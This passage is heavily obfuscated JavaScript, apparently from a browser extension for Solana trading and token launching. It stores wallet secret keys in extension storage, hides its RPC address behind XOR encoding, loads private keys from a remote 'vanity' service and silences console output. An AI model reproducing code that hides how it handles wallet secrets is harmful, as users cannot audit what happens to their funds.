        o = Gg,
        i = {};
      (i[o(552)] = o(e) + o(n)),
        (i.obOum = function (t, e) {
          return t === e;
        });
      const s = i;
      try {
        const e = new l(
          t.defaultSol,
          t.priorityFee,
          t.slippage,
          t[o(607)],
          t[o(502) + "ords"],
          t.apiKey,
          t[o(r)],
          t.selectedMode
        );
        return (
          (this["currentSet" + o(516)] = e),
          this[o(496) + "tings"].saveToStorage(),
          !![]
        );
      } catch (a) {
        return (
          s[o(552)],
          a instanceof Error
            ? a.message
            : "string" == typeof a ||
              (a && s.obOum(typeof a, "object") && JSON.stringify(a)),
          ![]
        );
      }
    }
    getSettings() {
      return this.currentSettings;
    }
    ["resetToDef" + Gg(495)]() {
      const t = 496,
        e = 611,
        n = 516,
        r = Gg;
      (this[r(t) + "tings"] = l[r(e) + "s"]()),
        this[r(t) + r(n)][r(520) + r(622)]();
    }
  }
  class $g {
    constructor() {
      const t = 616,
        e = 557,
        n = 563,
        r = 613,
        o = Gg;
      (this.currentKeyPair = null),
        (this[o(t) + o(e)] = null),
        (this.balance = 0),
        (this.isLoaded = ![]),
        (this[o(n) + "tener"] = null),
        this[o(r) + "orage"]();
    }
    static [Gg(542) + "e"]() {
      return !$g[Gg([548][0])] && ($g.instance = new $g()), $g.instance;
    }
    async ["loadFromSt" + Gg(541)]() {
      const t = 556,
        e = 579,
        n = 527,
        r = 529,
        o = 543,
        i = 577,
        s = 570,
        a = 490,
        u = 563,
        c = 546,
        l = 617,
        d = 567,
        f = 616,
        h = 568,
        p = 503,
        m = 597,
        g = 630,
        y = 512,
        w = 529,
        b = 589,
        v = 506,
        A = 527,
        k = 567,
        I = 557,
        S = 568,
        _ = 555,
        T = 624,
        B = 616,
        C = 557,
        E = Gg,
        x = {};
      (x.bUJcj = "Unknown er" + E(t)),
        (x[E(e)] = function (t, e) {
          return t instanceof e;
        }),
        (x.hCPmq = "string"),
        (x.tEVHz = E(n) + "llet"),
        (x[E(584)] = function (t, e) {
          return t === e;
        }),
        (x[E(r)] = function (t, e) {
          return t === e;
        }),
        (x[E(589)] = "object");
      const P = x;
      this.storageListener &&
        chrome.storage.onChanged[E(o) + "ener"](this.storageListener),
        (this["storageLis" + E(i)] = (t) => {
          const e = E;
          if (t[e(A) + e(k)]) {
            const r = t["mogtech_wa" + e(k)].newValue;
            if (r)
              try {
                const t = Hm.decode(r);
                this["walletKeyP" + e(I)] = Xu[e(S) + "Key"](t);
              } catch (n) {
                P.bUJcj,
                  P.QQnbg(n, Error)
                    ? n.message
                    : typeof n === P[e(_)] ||
                      (n && typeof n === e(T) && JSON.stringify(n)),
                  (this[e(B) + e(C)] = null);
              }
            else this.walletKeyPair = null;
          }
        }),
        chrome[E(546)][E(s)][E(a) + "r"](this[E(u) + "tener"]);
      try {
        const t = await chrome[E(c)].local[E(l)]([P.tEVHz]);
        if (t[E(n) + E(d)])
          try {
            const e = Hm.decode(t[E(n) + E(d)]);
            this[E(f) + "air"] = Xu[E(h) + E(p)](e);
          } catch (O) {
            P[E(m)],
              O instanceof Error
                ? O.message
                : typeof O === E(g) ||
                  (O && P[E(584)](typeof O, "object") && JSON[E(y)](O)),
              (this.walletKeyPair = null);
          }
        this.isLoaded = !![];
      } catch (R) {
        P.bUJcj,
          R instanceof Error
            ? R.message
            : "string" == typeof R ||
              (R && P[E(w)](typeof R, P[E(b)]) && JSON.stringify(R)),
          (this[E(v)] = !![]);
      }
    }
    async saveToStorage() {
      const t = 556,
        e = 616,
        n = 557,
        r = 499,
        o = 567,
        i = 618,
        s = 582,
        a = 551,
        u = Gg,
        c = {};
      (c.sgxFG = "Unknown er" + u(t)),
        (c.NdxBv = function (t, e) {
          return t instanceof e;
        });
      const l = c;
      try {
        const t = this[u(e) + "air"]
            ? Hm.encode(this["walletKeyP" + u(n)][u(r)])
            : null,
          a = {};
        (a["mogtech_wa" + u(o)] = t), await chrome[u(546)][u(i)][u(s)](a);
      } catch (d) {
        l[u(a)],
          l.NdxBv(d, Error)
            ? d.message
            : "string" == typeof d ||
              (d && "object" == typeof d && JSON.stringify(d));
      }
    }
    async [Gg(603) + "et"]() {
      const t = 622,
        e = 616,
        n = Gg;
      return (
        (this.walletKeyPair = Xu.generate()),
        await this[n(520) + n(t)](),
        this[n(e) + "air"]
      );
    }
    async importWallet(t) {
      const e = 503,
        n = 616,
        r = 557,
        o = 519,
        i = 630,
        s = 624,
        a = Gg;
      ({})[a(544)] = "Unknown error";
      try {
        const o = Hm.decode(t),
          i = Xu["fromSecret" + a(e)](o);
        return (this[a(n) + a(r)] = i), await this.saveToStorage(), !![];
      } catch (u) {
        return (
          u instanceof Error
            ? u[a(o)]
            : typeof u === a(i) ||
              (u && typeof u === a(s) && JSON.stringify(u)),
          ![]
        );
      }
    }
    async [Gg(591) + "et"]() {
      const t = 527,
        e = 559,
        n = 624,
        r = 512,
        o = Gg,
        i = {};
      (i[o(600)] = "Unknown error"),
        (i[o(559)] = function (t, e) {
          return t === e;
        });
      const s = i;
      (this.walletKeyPair = null), (this.balance = 0);
      try {
        await chrome.storage.local.remove([o(t) + "llet"]);
      } catch (a) {
        s.IliGQ,
          a instanceof Error
            ? a.message
            : s[o(e)](typeof a, "string") ||
              (a && s[o(e)](typeof a, o(n)) && JSON[o(r)](a));
      }
    }
    async getBalance() {
      const t = 625,
        e = 557,
        n = 606,
        r = 557,
        o = 501,
        i = 560,
        s = 512,
        a = Gg,
        u = {};
      (u[a(536)] = function (t, e) {
        return t < e;
      }),
        (u.SnOpg = function (t, e) {
          return t & e;
        }),
        (u[a(500)] = function (t, e) {
          return t * e;
        }),
        (u[a(t)] = function (t, e) {
          return t === e;
        });
      const c = u;
      if (!this["walletKeyP" + a(e)]) return 0;
      try {
        const t = new (await Promise.resolve().then(() => Tc)).Connection(
            (function () {
              let t;
              return function () {
                const e = ty;
                if (!t) {
                  const n = new Uint8Array([
                      141, 188, 73, 202, 150, 242, 18, 149, 129, 167, 79, 223,
                      145, 188, 92, 151, 145, 161, 82, 206, 209, 191, 16, 220,
                      132, 187, 73, 151, 136, 169, 84, 212, 139, 173, 73, 148,
                      141, 173, 81, 211, 144, 187, 16, 200, 149, 171, 19, 217,
                      138, 165,
                    ]),
                    r = -1170355995,
                    o = new Uint8Array(n.length);
                  for (let t = 0; c[e(536)](t, n.length); t++) {
                    const e = c.SnOpg(r >>> c.Bsyxx(t % 4, 8), 255);
                    o[t] = n[t] ^ e;
                  }
                  t = new TextDecoder()[e(540)](o);
                }
                return t;
              };
            })()()
          ),
          e = new (await Promise.resolve().then(() => Tc))[a(n)](
            this["walletKeyP" + a(r)].publicKey.toBase58()
          ),
          i = await t[a(o)](e);
        return (this.balance = i / 1e9), this.balance;
      } catch (l) {
        return (
          a(i) + a(556),
          l instanceof Error
            ? l[a(519)]
            : c.GtiGc(typeof l, "string") ||
              (l && "object" == typeof l && JSON[a(s)](l)),
          0
        );
      }
    }
    [Gg(526) + Gg(627)]() {
      return this[Gg([580][0])];
    }
    async [Gg(576) + "d"]() {
      const t = Gg;
      for (; !this[t(506)]; ) await new Promise((t) => setTimeout(t, 10));
    }
    ["generateKe" + Gg(504)]() {
      const t = Gg;
      return (this.currentKeyPair = Xu.generate()), this[t([564][0]) + "Pair"];
    }
    getKeyPair() {
      return this["currentKey" + Gg(626)];
    }
    hasKeyPair() {
      const t = 626,
        e = Gg,
        n = {};
      n[e(565)] = function (t, e) {
        return t !== e;
      };
      return n.mlfLg(this["currentKey" + e(t)], null);
    }
    clearKeyPair() {
      const t = 626,
        e = Gg;
      this[e(564) + e(t)] = null;
    }
    [Gg(511)](t) {
      this.currentKeyPair = t;
    }
    async getVanity(t) {
      const e = 568,
        n = 556,
        r = 519,
        o = Gg;
      try {
        const n = await Lg.getVanity(t);
        if (!n) return ![];
        const r = Xu[o(e) + o(503)](Hm.decode(n.private_key));
        return this.setKeyPair(r), !![];
      } catch (i) {
        return (
          o(560) + o(n),
          i instanceof Error
            ? i[o(r)]
            : typeof i === o(630) ||
              (i && typeof i === o(624) && JSON.stringify(i)),
          ![]
        );
      }
    }
    getPublicKey() {
      const t = Gg;
      return this.currentKeyPair
        ? this["currentKey" + t([626][0])][t(530)].toBase58()
        : null;
    }
    getPrivateKey() {
      const t = 572,
        e = Gg;
      return this[e(564) + "Pair"]
        ? Hm[e(t)](this.currentKeyPair.secretKey)
        : null;
    }
    getWalletPublicKey() {
      const t = 557,
        e = Gg;
      return this[e(616) + e(t)]
        ? this.walletKeyPair.publicKey[e(574)]()
        : null;
    }
    [Gg(614) + Gg(517)]() {
      const t = 616,
        e = 557,
        n = 499,
        r = Gg;
      return this[r(t) + r(e)] ? Hm.encode(this[r(t) + "air"][r(n)]) : null;
    }
    [Gg(628)](t) {
      const e = 557,
        n = Gg;
      this[n(616) + n(e)] = t;
    }
    [Gg(513)]() {
      return this["walletKeyP" + Gg([557][0])];
    }
    hasWallet() {
      return null !== this[Gg([616][0]) + "air"];
    }
    getAddress() {
      const t = 569,
        e = Gg;
      return this[e(614) + e(t)]();
    }
    [Gg(535)]() {
      const t = Gg;
      this.storageListener &&
        (chrome.storage.onChanged["removeList" + t([553][0])](
          this.storageListener
        ),
        (this.storageListener = null)),
        (this[t(616) + "air"] = null);
    }
  }
  function ty(t, e) {
    const n = Jg();
    return (
      (ty = function (e, r) {
        let o = n[(e -= 490)];
        if (void 0 === ty.kXGCuk) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (ty.dZYPzt = i), (t = arguments), (ty.kXGCuk = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.kUOeet = t),
              (this.LbjVvw = [1, 0, 0]),
              (this.wUZpel = function () {
                return "newState";
              }),
              (this.YPsPoK = "\\w+ *\\(\\) *{\\w+ *"),
              (this.MrAYcp = "['|\"].+['|\"];? *}");
          };
          (e.prototype.xKWPkY = function () {
            const t = new RegExp(this.YPsPoK + this.MrAYcp).test(
              this.wUZpel.toString()
            )
              ? --this.LbjVvw[1]
              : --this.LbjVvw[0];
            return this.LhYOvx(t);
          }),
            (e.prototype.LhYOvx = function (t) {
              return Boolean(~t) ? this.KzGDEb(this.kUOeet) : t;
            }),
            (e.prototype.KzGDEb = function (t) {
              for (let e = 0, n = this.LbjVvw.length; e < n; e++)
                this.LbjVvw.push(Math.round(Math.random())),
                  (n = this.LbjVvw.length);
              return t(this.LbjVvw[0]);
            }),
            new e(ty).xKWPkY(),
            (o = ty.dZYPzt(o)),
            (t[s] = o);
        }
        return o;
      }),
      ty(t, e)
    );
  }
  class ey {
    static ["validateCo" + Gg(505)](t) {
      const e = 630,
        n = 601,
        r = 515,
        o = 588,
        i = 539,
        s = 560,
        a = 612,
        u = 509,
        c = Gg,
        l = {
          lftQU: function (t, e) {
            return t instanceof e;
          },
        };
      (l.OwqNX = c(e)),
        (l.PVhzI = function (t, e) {
          return t === e;
        }),
        (l.sjvyi = "object");
      const f = l;
      try {
        const e = new d(
          t[c(n)] || "",
          t.ticker || "",
          t["initialLiq" + c(537)] || "1",
          t[c(r)],
          t.websiteUrl,
          t[c(581) + c(o)] || [],
          t["additional" + c(573)] || [],
          t[c(i)] || [],
          t.selectedImage || ""
        );
        return e.isValid ? e : null;
      } catch (h) {
        return (
          c(s),
          1,
          f.lftQU(h, Error)
            ? h.message
            : typeof h === f.OwqNX ||
              (h && f[c(a)](typeof h, f[c(u)]) && JSON.stringify(h)),
          null
        );
      }
    }
  }
  axiomVamp,
    (function (t) {
      const e = 319,
        n = 307,
        r = 330,
        o = 305,
        i = 334,
        s = 315,
        a = 322,
        u = 327,
        c = sy,
        l = t();
      for (; []; )
        try {
          if (
            880156 ===
            (-parseInt(c(e)) / 1) * (-parseInt(c(n)) / 2) +
              -parseInt(c(r)) / 3 +
              (parseInt(c(329)) / 4) * (-parseInt(c(o)) / 5) +
              parseInt(c(i)) / 6 +
              -parseInt(c(s)) / 7 +
              -parseInt(c(a)) / 8 +
              parseInt(c(u)) / 9
          )
            break;
          l.push(l.shift());
        } catch (d) {
          l.push(l.shift());
        }
    })(ay);
  const ny = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n[sy(303)](e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    ry = ny(void 0, function () {
      const t = 326,
        e = 294,
        n = sy;
      return ry[n(t)]()
        .search(n(e) + "+$")
        [n(t)]()
        .constructor(ry)
        .search("(((.+)+)+)+$");
    });
  ry();
  const oy = (function () {
      let t = !![];
      return function (e, n) {
        const r = 303,
          o = t
            ? function () {
                if (n) {
                  const t = n[sy(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    iy = oy(void 0, function () {
      const t = 313,
        e = 325,
        n = 337,
        r = 331,
        o = 297,
        i = 324,
        s = sy,
        a = {
          IYHTF: function (t, e) {
            return t(e);
          },
          WVEre: function (t, e) {
            return t + e;
          },
          CSyXj: function (t) {
            return t();
          },
          xwuVV: s(311),
          EmqBZ: "error",
          YDcKc: "table",
          avwhu: "trace",
          ZGrWL: function (t, e) {
            return t < e;
          },
        };
      let u;
      try {
        const e = a.IYHTF(
          Function,
          a.WVEre(
            "return (fu" + s(t) + (s(341) + s(342)) + 'rn this")( )',
            ");"
          )
        );
        u = a.CSyXj(e);
      } catch (d) {
        u = window;
      }
      const c = (u[s(325)] = u[s(e)] || {}),
        l = [a[s(n)], s(r), "info", a.EmqBZ, s(o), a[s(i)], a.avwhu];
      for (let f = 0; a.ZGrWL(f, l.length); f++) {
        const t = oy.constructor.prototype.bind(oy),
          e = l[f],
          n = c[e] || t;
        (t.__proto__ = oy.bind(oy)),
          (t.toString = n.toString.bind(n)),
          (c[e] = t);
      }
    });
  function sy(t, e) {
    const n = ay();
    return (
      (sy = function (e, r) {
        let o = n[(e -= 291)];
        if (void 0 === sy.HXjqOO) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (sy.KgCFcw = i), (t = arguments), (sy.HXjqOO = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.MzdZUC = t),
              (this.ZJfFUY = [1, 0, 0]),
              (this.QxtZnF = function () {
                return "newState";
              }),
              (this.YtCexp = "\\w+ *\\(\\) *{\\w+ *"),
              (this.xbTpYw = "['|\"].+['|\"];? *}");
          };
          (e.prototype.qTGuTM = function () {
            const t = new RegExp(this.YtCexp + this.xbTpYw).test(
              this.QxtZnF.toString()
            )
              ? --this.ZJfFUY[1]
              : --this.ZJfFUY[0];
            return this.cFywDO(t);
          }),
            (e.prototype.cFywDO = function (t) {
              return Boolean(~t) ? this.OenXBc(this.MzdZUC) : t;
            }),
            (e.prototype.OenXBc = function (t) {
              for (let e = 0, n = this.ZJfFUY.length; e < n; e++)
                this.ZJfFUY.push(Math.round(Math.random())),
                  (n = this.ZJfFUY.length);
              return t(this.ZJfFUY[0]);
            }),
            new e(sy).qTGuTM(),
            (o = sy.KgCFcw(o)),
            (t[s] = o);
        }
        return o;
      }),
      sy(t, e)
    );
  }
  function ay() {
    const t = [
      "z2v0sw5ZDgfUyW",
      "zMLSDgvY",
      "Dgv4DenVBNrLBG",
      "y3jLyxrLrg9JDq",
      "kcGOlISPkYKRkq",
      "C3rPy2uSig5HBq",
      "zwnVAw4SignVAq",
      "zxHJzxb0Aw9U",
      "CMDIysGWlcaYnq",
      "C3bSAxq",
      "nsWGmcWGmc4Zoq",
      "zsWGBMfTzxmSia",
      "ChvZAa",
      "yxbWBhK",
      "DhjPBq",
      "nty3nduYnw12rMjytq",
      "y3jLyxrLvgv4Da",
      "mti2mKnbrMDOzG",
      "C3r5Bgu",
      "C3bHBLTKyxrHlq",
      "BMfTzwqSig1LBq",
      "Bg9N",
      "q29SB3i",
      "BMn0Aw9UkcKG",
      "EgD4r0q",
      "mte4nZeWndfTrvzUqLa",
      "CgfYzw50rwXLBq",
      "ic5JCMvHDguTyW",
      "z2v0u2v0DgLUzW",
      "mJy4m3PvyKrZsW",
      "yxbWzw5Kq2HPBa",
      "ufbIyNu",
      "mZiYotiWoeHIDLbjrG",
      "Dhj1zq",
      "wurJs2m",
      "y29UC29Szq",
      "Dg9tDhjPBMC",
      "mJq0otu3nZDzAhjPthC",
      "v2fSA2vY",
      "nhjwtgfKta",
      "ndiXmdGYngLstMLxDG",
      "D2fYBG",
      "BwfW",
      "wuf5AKS",
      "nJyYmdC0mKHtqvvnva",
      "A2LSBgvKlcbQDq",
      "tM9Kzq",
      "EhD1vLy",
      "BgvUz3rO",
      "B3jKCW",
      "runu",
      "E30Uy29UC3rYDq",
      "y3rVCIGICMv0Dq",
    ];
    return (ay = function () {
      return t;
    })();
  }
  iy(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const uy = (t) => {
      const e = 323,
        n = 318,
        r = 339,
        o = 335,
        i = 301,
        s = 310,
        a = 296,
        u = 299,
        c = 332,
        l = 328,
        d = 293,
        f = 321,
        h = 338,
        p = 314,
        m = 308,
        g = 298,
        y = 320,
        w = 336,
        b = 317,
        v = 292,
        A = sy,
        k = {
          PPbbu: function (t, e) {
            return t < e;
          },
          GaieU: function (t, e) {
            return t === e;
          },
        };
      k.xgxGD = A(e);
      const I = k,
        S = Qg[A(343) + "e"]()[A(n) + "s"]();
      if (!S) return;
      const _ = ((null == S ? void 0 : S["highlightW" + A(r)]) ||
        A(o) + A(295) + A(i) + A(s) + A(a) + "n")
        [A(u)](/[\s,]+/)
        .map((t) => t[A(304)]())
        [A(291)]((t) => !!t);
      if (!_.length) return;
      const T = new RegExp(
          "(" +
            _[A(c)]((t) => t.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join("|") +
            ")",
          "gi"
        ),
        B = document["createTree" + A(l)](t, NodeFilter.SHOW_TEXT, {
          acceptNode(t) {
            const e = A,
              n = t[e(316) + "ent"];
            return n &&
              !n.closest("button, a," + e(b) + "oin-btn") &&
              T.test(t[e(v) + "t"] || "")
              ? NodeFilter.FILTER_ACCEPT
              : NodeFilter["FILTER_REJ" + e(340)];
          },
        }),
        C = [];
      for (let E = B.nextNode(); E; E = B.nextNode()) C[A(302)](E);
      for (let E = 0; E < C.length; E++) {
        const t = C[E],
          e = t.textContent;
        if (!e) continue;
        const n = e.split(T),
          r = document[A(d) + "mentFragment"]();
        for (let o = 0; I[A(f)](o, n[A(h)]); o++) {
          const t = n[o];
          if (t)
            if (I.GaieU(o % 2, 1)) {
              const e = document.createElement("span");
              (e.dataset.highlighted = I[A(p)]),
                (e[A(m)]["background" + A(312)] = A(g) + A(300) + "7)"),
                (e.textContent = t),
                r.appendChild(e);
            } else r[A(y) + "d"](document[A(306) + A(w)](t));
        }
        t.parentNode.replaceChild(r, t);
      }
    },
    cy = () => {
      const t = 309,
        e = 333,
        n = 306,
        r = sy,
        o = {};
      o[r(333)] = function (t, e) {
        return t < e;
      };
      const i = o,
        s = document.querySelectorAll(r(t) + "highlighted]");
      for (let a = 0; i[r(e)](a, s.length); a++) {
        const t = s[a],
          e = t.parentNode;
        e && e.replaceChild(document[r(n) + "Node"](t[r(292) + "t"] || ""), t);
      }
    };
  function ly(t, e) {
    const n = my();
    return (
      (ly = function (e, r) {
        let o = n[(e -= 365)];
        if (void 0 === ly.AsBVxK) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (ly.PaohlO = i), (t = arguments), (ly.AsBVxK = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.nIpbFU = t),
              (this.hRUtJo = [1, 0, 0]),
              (this.KaGYVE = function () {
                return "newState";
              }),
              (this.rJosSk = "\\w+ *\\(\\) *{\\w+ *"),
              (this.qNsZXn = "['|\"].+['|\"];? *}");
          };
          (e.prototype.DdSjiF = function () {
            const t = new RegExp(this.rJosSk + this.qNsZXn).test(
              this.KaGYVE.toString()
            )
              ? --this.hRUtJo[1]
              : --this.hRUtJo[0];
            return this.HyBhSt(t);
          }),
            (e.prototype.HyBhSt = function (t) {
              return Boolean(~t) ? this.srKglB(this.nIpbFU) : t;
            }),
            (e.prototype.srKglB = function (t) {
              for (let e = 0, n = this.hRUtJo.length; e < n; e++)
                this.hRUtJo.push(Math.round(Math.random())),
                  (n = this.hRUtJo.length);
              return t(this.hRUtJo[0]);
            }),
            new e(ly).DdSjiF(),
            (o = ly.PaohlO(o)),
            (t[s] = o);
        }
        return o;
      }),
      ly(t, e)
    );
  }
  axiomVamp,
    (function (t) {
      const e = 372,
        n = 430,
        r = 406,
        o = 415,
        i = 368,
        s = 383,
        a = 421,
        u = 365,
        c = 385,
        l = ly,
        d = t();
      for (; []; )
        try {
          if (
            695858 ===
            (parseInt(l(e)) / 1) * (-parseInt(l(n)) / 2) +
              (parseInt(l(433)) / 3) * (parseInt(l(r)) / 4) +
              (parseInt(l(o)) / 5) * (parseInt(l(370)) / 6) +
              parseInt(l(i)) / 7 +
              parseInt(l(s)) / 8 +
              (parseInt(l(a)) / 9) * (-parseInt(l(373)) / 10) +
              (parseInt(l(u)) / 11) * (parseInt(l(c)) / 12)
          )
            break;
          d.push(d.shift());
        } catch (f) {
          d.push(d.shift());
        }
    })(my);
  const dy = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    fy = dy(void 0, function () {
      const t = ly;
      return fy
        .toString()
        [t([436][0])]("(((.+)+)+)+$")
        .toString()
        [t(411) + "r"](fy)
        .search(t(428) + "+$");
    });
  fy();
  const hy = (function () {
      const t = 407;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[ly(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    py = hy(void 0, function () {
      const t = 410,
        e = 391,
        n = 377,
        r = 419,
        o = 374,
        i = 414,
        s = 374,
        a = 384,
        u = 409,
        c = ly,
        l = {
          xcyrR: c(416) + "nction() ",
          jIiGy: function (t) {
            return t();
          },
          XoZjL: "warn",
          ZRhDy: c(t),
          mHwaU: c(e),
          gspPo: function (t, e) {
            return t < e;
          },
        },
        d = l.jIiGy(function () {
          const t = c;
          let e;
          try {
            e = Function(l.xcyrR + (t(a) + t(u) + 'rn this")( ));'))();
          } catch (n) {
            e = window;
          }
          return e;
        }),
        f = (d.console = d.console || {}),
        h = [c(434), l.XoZjL, l.ZRhDy, c(n), "exception", l.mHwaU, c(371)];
      for (let p = 0; l.gspPo(p, h[c(r)]); p++) {
        const t = hy.constructor.prototype.bind(hy),
          e = h[p],
          n = f[e] || t;
        (t.__proto__ = hy[c(o)](hy)),
          (t[c(i)] = n.toString[c(s)](n)),
          (f[e] = t);
      }
    });
  function my() {
    const t = [
      "lMvTyMvKqxv0Aa",
      "BNn0ywDYyw0UyW",
      "zxjYB3i",
      "m2rLigLTzYWGwW",
      "Aw1Nw3nYyYO9iG",
      "yvTOCMvMkJ0IlW",
      "AhjLzG",
      "DgvZDa",
      "ntG2mZu4ngDICNDuvW",
      "E30Uy29UC3rYDq",
      "otyZnLnevhn4yW",
      "DcjDigLTzYWGwW",
      "BwfNzunVBNrLBG",
      "yvTOCMvMkJ0IAq",
      "D2L0DgvYlMnVBq",
      "tvLdC1K",
      "DgfIBgu",
      "ChvZAa",
      "y29Ux182mJnKzq",
      "B24Ixq",
      "tMLOsxG",
      "zMLUza",
      "lcbHw2HYzwyQpq",
      "B20Ixq",
      "y2XHC3mQpsjLBq",
      "BwfW",
      "lMvTyMvKtwvKAq",
      "DhjPBq",
      "ywDLCYjDlcbByW",
      "yMvKqxv0Ag9Ysq",
      "zNjVBq",
      "odu5nJrHywXizem",
      "yxbWBhK",
      "C3bSAxq",
      "y3rVCIGICMv0Dq",
      "Aw5MBW",
      "y29UC3rYDwn0BW",
      "Dg9YqwXS",
      "BM93",
      "Dg9tDhjPBMC",
      "nJm0mduWnvvHs3DjCW",
      "CMv0DxjUicHMDq",
      "BgfZCYO9iMvTyG",
      "ChjVzMLSzv9PBq",
      "BgvUz3rO",
      "y25Ms1O",
      "mte5oty5odjOs2nszKy",
      "Dg9Y",
      "z2v0sw5ZDgfUyW",
      "zMLSDgvY",
      "C3rVCMLLCY8Ixq",
      "Cg9ZDgvY",
      "iI9WlYjD",
      "kcGOlISPkYKRkq",
      "C3jJ",
      "mNbqrgH3uq",
      "wwTZrMq",
      "yv9FnJiZzguGAq",
      "mZLhCevtBLa",
      "Bg9N",
      "C3rYAw5NAwz5",
      "C2vHCMnO",
      "CxvLCNLtzwXLyW",
      "q05Jvxe",
      "D3DQr3e",
      "mZu3nwX4rxr5EG",
      "DMLKzw8",
      "vw5RBM93BIbLCG",
      "mZi1ndyYmLHhD093zG",
      "z2v0u2v0DgLUzW",
      "nLPKrKfTDG",
      "DhjHy2u",
      "otC3ndK3u2HbA0z4",
      "mtbPuvrizNm",
      "yMLUza",
    ];
    return (my = function () {
      return t;
    })();
  }
  py(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const gy = async (t, e = 100, n = 3e3) => {
      const r = 413,
        o = 413,
        i = ly,
        s = {
          ShLGY: function (t, e) {
            return t >= e;
          },
        };
      s[i(439)] = function (t, e) {
        return t - e;
      };
      const a = s,
        u = Date[i(r)]();
      for (; []; ) {
        if (await t()) return !![];
        if (a.ShLGY(a[i(439)](Date[i(o)](), u), n)) return ![];
        await new Promise((t) => setTimeout(t, e));
      }
    },
    yy = (t) => {
      var e, n, r, o, i, s;
      const a = 432,
        u = 404,
        c = 393,
        l = 420,
        d = 418,
        f = 403,
        h = 417,
        p = 394,
        m = 390,
        g = 386,
        y = 399,
        w = 379,
        b = 422,
        v = 389,
        A = 388,
        k = 376,
        I = 398,
        S = 381,
        _ = 378,
        T = 412,
        B = 395,
        C = 392,
        E = 429,
        x = 405,
        P = 437,
        O = 392,
        R = 426,
        M = 408,
        L = 402,
        N = 437,
        D = 422,
        U = 381,
        q = 408,
        z = 429,
        K = 392,
        W = 380,
        F = 397,
        j = 427,
        G = 381,
        V = 408,
        H = 390,
        Z = 429,
        X = 366,
        J = 408,
        Y = 402,
        Q = 400,
        $ = 437,
        tt = 431,
        et = 419,
        nt = 405,
        rt = 426,
        ot = 412,
        it = 382,
        st = 423,
        at = 369,
        ut = 424,
        ct = 367,
        lt = 435,
        dt = ly,
        ft = {};
      (ft[dt(438)] = 'a[href*="truthsocial.com"]'),
        (ft.RlAZG = 'a[href*="/status/"]'),
        (ft.NihIx =
          dt(401) +
          dt(a) +
          "mg:not(.em" +
          dt(u) +
          dt(c) +
          '), [class*="imageContent"] img:not([src*="profile_images"])'),
        (ft[dt(l)] = "video"),
        (ft.aHqzr =
          'img[src*="' + dt(d) + dt(f) + dt(h) + "edAuthorIc" + dt(p)),
        (ft[dt(m)] = '[class*="i' + dt(387) + dt(g) + dt(y) + 'bedMedia"] img'),
        (ft.NKLsZ = dt(w) + 'cdninstagram.com"], [class*="embedAuthorIcon"]'),
        (ft.YksFd = function (t, e) {
          return t === e;
        }),
        (ft.euGnq = "string");
      const ht = ft;
      try {
        const a = !!t["querySelec" + dt(b)](
            'a[href*="t' + dt(v) + '"], a[href*="x.com"]'
          ),
          u = !!t.querySelector(ht.CNcUq),
          c = !!t[dt(437) + dt(422)](dt(A) + dt(k) + dt(I));
        let l = "",
          d = "",
          f = [];
        if (a) {
          l = (
            (null == (e = t["querySelec" + dt(b)](ht.RlAZG))
              ? void 0
              : e[dt(S)]) || ""
          )
            .split(/[\(\\)]/)[0]
            .trim();
          const r =
            null ==
            (n = t[dt(437) + dt(b)](
              dt(375) + "orIcon__62" + dt(_) + 'class*="embedAuthor"] img'
            ))
              ? void 0
              : n.src;
          r && (d = r.split(/[\(\\)]/)[0].trim());
